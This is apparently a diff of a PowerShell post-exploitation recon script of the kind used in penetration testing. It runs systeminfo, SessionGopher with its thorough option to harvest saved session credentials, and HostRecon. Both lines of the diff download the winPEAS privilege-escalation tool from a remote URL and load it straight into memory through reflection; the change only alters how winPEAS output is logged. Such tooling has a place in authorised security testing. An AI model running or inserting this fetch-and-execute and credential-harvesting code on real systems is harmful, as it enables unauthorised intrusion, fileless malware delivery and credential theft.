@@ -2,7 +2,7 @@ try {systeminfo | tee systeminfo.txt}
 catch {$_}
 try {Invoke-SessionGopher -Thorough}
 catch {$_}
-try {$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url_1029384756/tools/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("log=$pwd/winpeas.txt")}
+try {$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url_1029384756/tools/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") | tee winpeas.txt }
 catch {$_}
 try {Invoke-HostRecon | tee hostrecon.txt}
 catch {$_}
